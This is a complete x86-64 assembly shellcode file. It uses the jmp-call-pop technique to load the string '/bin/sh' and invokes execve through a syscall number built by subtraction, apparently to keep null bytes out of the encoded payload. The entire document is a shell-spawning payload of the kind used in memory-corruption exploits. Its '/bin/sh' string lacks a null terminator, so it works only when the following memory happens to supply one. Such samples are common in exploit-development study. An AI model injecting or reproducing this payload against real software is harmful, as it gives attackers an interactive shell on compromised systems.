.section .text
.global _start

_start:
	jmp shellstr

code:
	pop %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	mov $0x1111114C, %rax
	sub $0x11111111, %rax
	syscall 		# execve("/bin/sh", NULL, NULL)

shellstr:
	call code
	.ascii "/bin/sh"
